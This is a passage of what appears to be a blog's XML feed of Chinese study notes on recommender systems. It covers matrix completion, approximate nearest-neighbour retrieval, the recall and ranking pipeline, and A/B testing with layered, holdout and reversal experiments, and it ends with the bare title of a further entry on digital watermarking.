style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">u</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">b</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathdefault">i</span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">⟩</span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.054008em;"><span style="top:-3.3029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">.</span></span></span></span></span></p><h2 id="5-3-为什么是矩阵补充">5.3 为什么是矩阵补充</h2><p><img src="image_oKXXZXCBXg.png" alt=""></p><p>可以上述上述内容看成一个矩阵，其中绿色位置表示曝光给用户的物品；灰色位置表示没有曝光。之后可以计算出还未曝光的物品对于用户的吸引力，从而进行推荐。</p><p>但是矩阵补充方法在实践中的效果并不是很好，原因如下：</p><ol><li><p>仅用 ID embedding，没利用物品、用户属性。</p><ul><li><p>物品属性有类⽬、关键词、地理位置、作者信息；</p></li><li><p>用户属性有性别、年龄、地理定位、感兴趣的类⽬；</p></li></ul><p>双塔模型可以看做矩阵补充的升级版。</p></li><li><p>负样本的选取方式不对。</p><p>样本是用户—物品的二元组，记作 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mi>u</mi><mo separator="true">,</mo><mi>i</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(u,i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">u</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">i</span><span class="mclose">)</span></span></span></span>。</p><ul><li><p>正样本：曝光之后，有点击、交互等行为（正确的做法）；</p></li><li><p>负样本：曝光之后，没有点击、交互（错误的做法）；</p></li></ul></li><li><p>做训练的方法不好。</p><p>做向量的内积 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">⟨</mo><mi mathvariant="bold">a</mi><mi mathvariant="normal">_</mi><mn>1</mn><mo separator="true">,</mo><mi mathvariant="bold">b</mi><mi mathvariant="normal">_</mi><mi>j</mi><mo fence="true">⟩</mo></mrow><annotation encoding="application/x-tex">\left\langle\mathbf{a}\_{1}, \mathbf{b}\_{j}\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.20001em;vertical-align:-0.35001em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size1">⟨</span></span><span class="mord"><span class="mord mathbf">a</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord">1</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathbf">b</span></span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size1">⟩</span></span></span></span></span></span> 不如余弦相似度，用均方损失（回归），不如用交叉熵损失（分类）。</p></li></ol><h2 id="5-4-线上服务">5.4 线上服务</h2><p>在训练好模型之后，可以把模型用作推荐系统中的召回通道。做完训练之后，要把模型存储在正确的地方，便于做召回。</p><p>训练得到矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span></span></span></span> 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span>：</p><ol><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span></span></span></span> 的每一列对应一个用户</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span> 的每一列对应一个物品</li></ol><p>把矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span></span></span></span> 的列存储到 key-value 表，其中 key 是用户 ID，value 是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault">A</span></span></span></span> 的一列，给定用户 ID，返回一个向量（用户的 embedding）。而矩阵 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>B</mi></mrow><annotation encoding="application/x-tex">B</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.05017em;">B</span></span></span></span> 的存储和索引比较复杂。</p><p>之后可以做线上服务，具体来说，把用户 ID 作为 key，查询 key-value 表，得到该用户的向量，记作 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>。查找用户 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span> 最有可能感兴趣的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 各物品，作为召回结果。</p><p>其中第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span> 号物品的 embedding 向量记作 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>b</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">b_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault">b</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，内积 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">⟨</mo><mi mathvariant="normal">a</mi><mo separator="true">,</mo><msub><mi mathvariant="normal">b</mi><mi>i</mi></msub><mo fence="true">⟩</mo></mrow><annotation encoding="application/x-tex">\left\langle\mathrm{a}, \mathrm{b}_{i}\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">⟨</span><span class="mord"><span class="mord mathrm">a</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">b</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">⟩</span></span></span></span></span> 是用户对第 $i $ 号物品兴趣的预估，并计算返回内积最大的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个物品。</p><blockquote><p>如果枚举所有物品，时间复杂度正比于物品数量</p></blockquote><h2 id="5-5-近似最近邻查找">5.5 近似最近邻查找</h2><p>在用户向量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span> 作为 query，查找使得 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo fence="true">⟨</mo><mi mathvariant="normal">a</mi><mo separator="true">,</mo><msub><mi mathvariant="normal">b</mi><mi>i</mi></msub><mo fence="true">⟩</mo></mrow><annotation encoding="application/x-tex">\left\langle\mathrm{a}, \mathrm{b}_{i}\right\rangle</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">⟨</span><span class="mord"><span class="mord mathrm">a</span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">b</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;">⟩</span></span></span></span></span> 最大化的物品 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span> 时，暴力枚举速度太慢，实践中使用近似最近邻查找（Approximate Nearest Neighbor Search）。</p><p>Milvus、Faiss、HnswLib 等向量数据库均支持近似最近邻查找。</p><p><img src="image_eFQa1u_QlR.png" alt=""></p><p>在对数据上线之前，先对数据做预处理，把数据划分为很多区域，至于如何划分，取决于衡量距离的方法。划分后每个区域用一个向量表示，这些向量的长度都是1，并建立索引，把每个区域的向量作为 key，区域中所有点作为 value。给定一个向量，可以快速取回这个向量中所有的点。</p><p><img src="image_yY7g1kfwyL.png" alt=""></p><p>给定一个向量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span>，可以把 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span> 和区域中所有向量做对比，并计算他们的相似度，这一步的计算开销不大。找出最相似的一个向量，并把这个向量所有点给取出来，再和向量 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span> 计算相似度。</p><p><img src="image_S8I2UBtOQf.png" alt=""></p><p>最后找到最相似的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个物品，那么这 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi></mrow><annotation encoding="application/x-tex">k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span></span></span></span> 个物品就是最近邻查找的结果，并进行返回。</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSS推荐系统学习笔记1：概要</title>
      <link href="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/"/>
      <url>/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/</url>
      
        <content type="html"><![CDATA[<h1 id="1-评价推荐系统的指标"><a href="#1-评价推荐系统的指标" class="headerlink" title="1 评价推荐系统的指标"></a>1 评价推荐系统的指标</h1><h2 id="1-1-消费指标"><a href="#1-1-消费指标" class="headerlink" title="1.1 消费指标"></a>1.1 消费指标</h2><ul><li>点击率 &#x3D; 点击次数 &#x2F; 曝光次数</li><li>点赞率 &#x3D; 点赞次数 &#x2F; 点击次数</li><li>收藏率 &#x3D; 收藏次数 &#x2F; 点击次数</li><li>转发率 &#x3D; 转发次数 &#x2F; 点击次数</li><li>阅读完成率 &#x3D; 滑动到底次数 &#x2F; 点击次数 × f(笔记长度)</li></ul><p>上面只是短期消费指标，不是最重要的指标。衡量推荐系统的好坏最重要的指标是北极星指标。</p><h2 id="1-2-北极星指标"><a href="#1-2-北极星指标" class="headerlink" title="1.2 北极星指标"></a>1.2 北极星指标</h2><p>北极星指标是衡量推荐系统好坏的根本指标。</p><ol><li>用户规模：日活用户数（DAU）、月活用户数（MAU）</li><li>消费：人均使用推荐的时长、人均阅读笔记的数量</li><li>发布：发布渗透率、人均发布量</li></ol><hr><h1 id="2-实验流程"><a href="#2-实验流程" class="headerlink" title="2 实验流程"></a>2 实验流程</h1><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_2PCDMM3kdO.png"></p><p><strong>离线实验</strong>： 收集历史数据，在历史数据上做训练、测试。算法没有部署到产品中，没有跟用户交互。</p><p><strong>小流量AB测试</strong>：把算法部署到实际产品中，用户实际跟算法做交互。</p><hr><h1 id="3-推荐系统的链路"><a href="#3-推荐系统的链路" class="headerlink" title="3 推荐系统的链路"></a>3 推荐系统的链路</h1><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_sru3QNekMN.png"></p><p>推荐系统的目标是从几亿个物品中选出几十个物品展示给用户。</p><h2 id="3-1-召回"><a href="#3-1-召回" class="headerlink" title="3.1 召回"></a>3.1 召回</h2><p>有很多召回通道，快速从上亿篇笔记中取出几千篇笔记，作为候选集。</p><blockquote><p>召回通道：协同过滤、双塔模型、关注的作者等等。</p></blockquote><h2 id="3-2-粗排、精排"><a href="#3-2-粗排、精排" class="headerlink" title="3.2 粗排、精排"></a>3.2 粗排、精排</h2><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_9NxdSiMd5H.png"></p><p>首先是粗排，用小规模的神经网络给几千篇笔记打分，选出分数最高的几百篇。之后是精排，用大规模神经网络给几百篇笔记打分。</p><p>精排和粗排十分相似，唯一的区别就是精排的模型更大，用的特征更多。</p><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_I2j-a7Fxt_.png"></p><p>首先把特征送入神经网络，之后输出很多数值，比如点击率、点赞率、收藏率和转发率。这些数值都是神经网络对用户行为的预估，数值越大，说明用户对笔记越感兴趣。</p><p>最后对数值进行加权和，得到分数，这个分数决定了这个笔记是否会展示给用户，以及笔记展示的位置靠前还是靠后。</p><h2 id="3-3-重排"><a href="#3-3-重排" class="headerlink" title="3.3 重排"></a>3.3 重排</h2><p>重排最重要的功能是做多样性抽样（比如MMR、DPP），从几百篇中选出几十篇。抽样的时候有2个依据，一个是精排的分数，另一个是多样性。做完抽样之后，会用规则打散相似笔记。</p><p>重排的另一个目的是插入广告和运营推广内容，根据生态要求调整顺序。重排的规则比较复杂。</p><hr><h1 id="4-A-B测试"><a href="#4-A-B测试" class="headerlink" title="4 A&#x2F;B测试"></a>4 A&#x2F;B测试</h1><p>所有对模型和策略的改进都需要通过 A&#x2F;B 测试，用实验数据来验证模型和策略是否有效。</p><p>召回团队实现了一种 GNN 召回通道，离线实验结果正向。下一步是做线上的小流量 A&#x2F;B 测试，考察新的召回通道对线上指标的影响。模型中有一些参数，比如 GNN 的深度取值 $\{1,2,3\}$，需要用 A&#x2F;B 测试选取最优参数。</p><h2 id="4-1-随机分桶"><a href="#4-1-随机分桶" class="headerlink" title="4.1 随机分桶"></a>4.1 随机分桶</h2><p>分 $b&#x3D;10$ 个桶，每个桶中有 10% 的用户。首先用哈希函数把用户 ID 映射成某个区间内的整数，然后把这些整数均匀随机分成 $b$ 个桶。</p><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_0Oc3Y2_Bo2.png"></p><p>计算每个桶的业务指标，比如 DAU、人均使用推荐的时长点击率等等。如果某个实验组指标显著优于对照组，则说明对应的策略有效，值得推全。</p><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_ekqWmpu5fr.png"></p><h2 id="4-2-分层实验"><a href="#4-2-分层实验" class="headerlink" title="4.2 分层实验"></a>4.2 分层实验</h2><p>信息流产品的公司有很多部门和团队，大家都需要做 A&#x2F;B 测试。</p><ul><li>推荐系统（召回、粗排、精排、重排）</li><li>用户界面</li><li>广告</li></ul><p>如果把用户随机分成 10 组，1 组做对照，9 组做实验，那么只能同时做 9 组实验。会遇到流量不够用的情况，这时可以使用分层实验来进行解决。</p><p><strong>分层实验：</strong>召回、粗排、精排、重排、用户界面、广告（例如 GNN 召回通道属于召回层）。</p><p><strong>同层互斥：</strong>GNN 实验占了召回层的 4 个桶，其他召回实验只能用剩余的 6 个桶。</p><p><strong>不同层正交：</strong>每⼀层独⽴随机对用户做分桶。每⼀层都可以独立用 100% 的用户做实验。</p><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_i8Dm7u7VdE.png"></p><h3 id="4-2-1-同层互斥"><a href="#4-2-1-同层互斥" class="headerlink" title="4.2.1 同层互斥"></a>4.2.1 同层互斥</h3><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_KY8C1kNwCu.png"></p><h3 id="4-2-2-不同层正交"><a href="#4-2-2-不同层正交" class="headerlink" title="4.2.2 不同层正交"></a>4.2.2 不同层正交</h3><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_cPNpZ_jsoI.png"></p><h2 id="4-3-互斥-vs-正交"><a href="#4-3-互斥-vs-正交" class="headerlink" title="4.3 互斥 vs 正交"></a>4.3 互斥 vs 正交</h2><p>如果所有实验都正交，则可以同时做无数组实验。</p><p>同类的策略（例如精排模型的两种结构）天然互斥，对于⼀个用户，只能用其中⼀种。</p><p>同类的策略（例如添加两条召回通道）效果会相互增强（$1+1&gt;2$）或相互抵消（$1+1&lt;2$）。互斥可以避免同类策略相互⼲扰。</p><p>不同类型的策略（例如添加召回通道、优化粗排模型）通常不会相互干扰（$1+1&#x3D;2$），可以作为正交的两层。</p><h2 id="4-4-Holdout机制"><a href="#4-4-Holdout机制" class="headerlink" title="4.4 Holdout机制"></a>4.4 Holdout机制</h2><p>每个实验（召回、粗排、精排、重排）独立汇报对业务指标的提升。公司考察⼀个部门（比如推荐系统）在⼀段时间内对业务指标总体的提升。</p><p>取 10% 的用户作为 holdout 桶，推荐系统使用剩余90%的用户做实验，两者互斥。</p><p>10% holdout 桶 vs 90% 实验桶的 diff（需要归一化）为整个部门的业务指标收益。</p><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_80K5eKqTyh.png"></p><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_a7aJj3m1oG.png"></p><p>每个考核周期结束之后，清除 holdout 桶，让推全实验从 90% 用户扩大到 100% 用户。重新随机划分用户，得到 holdout 桶和实验桶，开始下⼀轮考核周期。</p><p>新的 holdout 桶与实验桶各种业务指标的 diff 接近 0。随着召回、粗排、精排、重排实验上线和推全，diff会逐渐扩大。</p><h2 id="4-5-实验推全和反转实验"><a href="#4-5-实验推全和反转实验" class="headerlink" title="4.5 实验推全和反转实验"></a>4.5 实验推全和反转实验</h2><h3 id="4-5-1-实验推全"><a href="#4-5-1-实验推全" class="headerlink" title="4.5.1 实验推全"></a>4.5.1 实验推全</h3><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_BUHxknVEyP.png"></p><p>推荐系统中所有业务都是从小流量开始的，如果推荐系统中所有diff正向，则可以推全。例如，首先在20%的用户进行测试，如果有效，则把这个实验给关掉。之后新开一层。</p><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_RYL-OAKfVz.png"></p><p>小流量测试时，新策略只作用于20%的用户，会微弱的提升实验桶和holdout桶的diff。推全之后，新策略作用于90%的用户，会将这个diff扩大9倍。</p><h3 id="4-5-2-反转实验"><a href="#4-5-2-反转实验" class="headerlink" title="4.5.2 反转实验"></a>4.5.2 反转实验</h3><p>有的指标（点击、交互）<strong>立刻受到新策略影响</strong>，有的指标（留存）有<strong>滞后性</strong>，需要长期观测。</p><p>实验观测到显著收益后尽快推全新策略。目的是腾出桶供其他实验使用，或需要基于新策略做后续的开发。</p><p>用反转实验解决上述矛盾，既可以尽快推全，也可以长期观测实验指标。具体做法是在推全的新层中开一个旧策略的桶，长期观测实验指标。</p><p><img src="/2024/10/08/WSS%E6%8E%A8%E8%8D%90%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01%EF%BC%9A%E6%A6%82%E8%A6%81/image_UCbxfin_Ix.png"></p><p>可以把反转桶保留很久，长期观察新策略与旧策略的diff。</p><hr><h1 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h1><p><strong>分层实验</strong>：同层互斥（不允许两个实验同时影响⼀位用户）、不同层正交（实验有重叠的用户）。</p><p><strong>Holdout</strong>：保留 10% 的用户，完全不受实验影响，可以考察整个部门对业务指标的贡献。</p><p><strong>实验推全</strong>：新建⼀个推全层，与其他层正交。</p><p><strong>反转实验</strong>：在新的推全层上，保留⼀个⼩的反转桶，使用旧策略。长期观测新旧策略的 diff。</p>]]></content>
      
      
      <categories>
          
          <category> 推荐系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 推荐系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>隐式（不可见）数字水印生成和攻击技术综述</title>
      <link href="/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/"/>
      <url>/2024/10/04/%E9%9A%90%E5%BC%8F%EF%BC%88%E4%B8%8D%E5%8F%AF%E8%A7%81%EF%BC%89%E6%95%B0%E5%AD%97%E6%B0%B4%E5%8D%B0%E7%94%9F%E6%88%90%E5%92%8C%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF%E7%BB%BC%E8%BF%B0/</url>
      
